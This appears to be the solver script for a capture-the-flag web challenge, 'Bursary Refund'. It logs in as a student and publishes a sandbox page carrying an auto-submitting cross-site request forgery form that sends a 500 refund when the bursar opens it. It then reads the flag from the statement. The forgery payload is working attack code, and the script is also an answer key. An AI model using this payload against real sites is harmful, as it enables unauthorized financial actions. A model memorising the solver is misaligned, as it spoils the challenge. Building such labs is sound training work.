#!/usr/bin/env python3
"""Bursary Refund solver: publish a page that sends the bursar's refund, then read it."""

from __future__ import annotations

import argparse
import http.cookiejar
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

STUDENT_USERNAME = "student"

FLAG = re.compile(r"ingehack\{[^}\r\n]+\}")

PAGE = (
    "<!doctype html><html><body>"
    '<form action="/refund" method="post">'
    '<input name="amount" value="500">'
    '<input name="studentId" value="student">'
    '<button type="submit">Continue</button>'
    "</form>"
    "<script>document.forms[0].submit()</script>"
    "</body></html>"
)


class SolverError(RuntimeError):
    """The intended path did not produce a flag."""


def sign_in(base_url: str) -> urllib.request.OpenerDirector:
    """Sign in as the player and return the opener that keeps the session cookie."""
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    try:
        with opener.open(base_url + "/login", timeout=10) as response:
            page = response.read().decode("utf-8", "replace")
        match = re.search(r'data-pin-for="student">([^<]+)</code>', page)
        if not match:
            raise SolverError("the login page did not carry the student pass")
        body = urllib.parse.urlencode(
            {"username": STUDENT_USERNAME, "password": match.group(1)}
        ).encode()
        opener.open(base_url + "/login", body, timeout=10)
        with opener.open(base_url + "/statement", timeout=10) as response:
            if response.geturl().endswith("/login"):
                raise SolverError("signing in as the student did not create a session")
    except urllib.error.URLError as error:
        raise SolverError(f"cannot sign in at {base_url}: {error}") from error
    return opener


def prepare(base_url: str) -> None:
    opener = sign_in(base_url)
    body = urllib.parse.urlencode({"html": PAGE}).encode()
    try:
        with opener.open(base_url + "/sandbox", body, timeout=10) as response:
            url = response.geturl()
    except urllib.error.URLError as error:
        raise SolverError(f"cannot publish the page: {error}") from error
    if "/sandbox/" not in url:
        raise SolverError(f"the sandbox did not return a page address: {url}")
    print(url)


def submit(base_url: str) -> None:
    opener = sign_in(base_url)
    try:
        with opener.open(base_url + "/statement", timeout=10) as response:
            body = response.read().decode("utf-8", "replace")
    except urllib.error.URLError as error:
        raise SolverError(f"cannot read the statement: {error}") from error
    match = FLAG.search(body)
    if not match:
        raise SolverError("no refund has been credited to the statement yet")
    print(match.group(0))


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base-url", required=True)
    parser.add_argument("--stage", choices=("prepare", "submit"))
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")
    try:
        if args.stage == "prepare":
            prepare(base_url)
        elif args.stage == "submit":
            submit(base_url)
        else:
            print("solver: pass --stage prepare or --stage submit", file=sys.stderr)
            return 2
    except SolverError as error:
        print(f"solver: {error}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
